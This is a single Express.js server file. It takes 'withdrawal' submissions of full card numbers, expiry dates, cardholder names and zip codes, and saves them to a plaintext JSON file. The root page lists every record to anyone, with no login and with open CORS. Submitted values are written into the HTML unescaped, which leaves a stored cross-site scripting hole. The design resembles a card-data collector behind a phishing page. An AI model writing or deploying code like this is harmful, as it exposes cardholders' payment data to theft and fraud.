const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'withdrawals.json');

// Middleware
app.use(express.json());
app.use(cors());

// Store withdrawal data
async function saveWithdrawal(data) {
    try {
        let withdrawals = [];
        try {
            const content = await fs.readFile(DATA_FILE, 'utf8');
            withdrawals = JSON.parse(content);
        } catch (error) {
            // File doesn't exist yet or is empty, start with empty array
        }

        withdrawals.push({
            ...data,
            timestamp: new Date().toISOString()
        });

        await fs.writeFile(DATA_FILE, JSON.stringify(withdrawals, null, 2));
    } catch (error) {
        console.error('Error saving withdrawal:', error);
        throw error;
    }
}

// Generate HTML display
function generateHTML(withdrawals) {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Withdrawal Records</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 20px;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 20px;
                }
                th, td {
                    border: 1px solid #ddd;
                    padding: 8px;
                    text-align: left;
                }
                th {
                    background-color: #1564C0;
                    color: white;
                }
                tr:nth-child(even) {
                    background-color: #f2f2f2;
                }
            </style>
        </head>
        <body>
            <h1>Withdrawal Records</h1>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>Amount</th>
                    <th>Card Number</th>
                    <th>Expiration</th>
                    <th>Name</th>
                    <th>Zip Code</th>
                </tr>
                ${withdrawals.map(w => `
                    <tr>
                        <td>${new Date(w.timestamp).toLocaleString()}</td>
                        <td>$${w.amount.toFixed(2)}</td>
                        <td>${w.cardNumber}</td>
                        <td>${w.cardExp}</td>
                        <td>${w.cardName}</td>
                        <td>${w.zipCode}</td>
                    </tr>
                `).join('')}
            </table>
        </body>
        </html>
    `;
}

// API endpoint to handle withdrawal submissions
app.post('/api/withdraw', async (req, res) => {
    try {
        const withdrawalData = req.body;
        
        // Basic validation
        if (!withdrawalData.amount || !withdrawalData.cardNumber || 
            !withdrawalData.cardExp || !withdrawalData.cardName || 
            !withdrawalData.zipCode) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        await saveWithdrawal(withdrawalData);
        res.json({ message: 'Withdrawal recorded successfully' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to process withdrawal' });
    }
});

// Route to display all withdrawals
app.get('/', async (req, res) => {
    try {
        let withdrawals = [];
        try {
            const content = await fs.readFile(DATA_FILE, 'utf8');
            withdrawals = JSON.parse(content);
        } catch (error) {
            // File doesn't exist yet or is empty
        }

        const html = generateHTML(withdrawals);
        res.send(html);
    } catch (error) {
        res.status(500).send('Error loading withdrawal records');
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
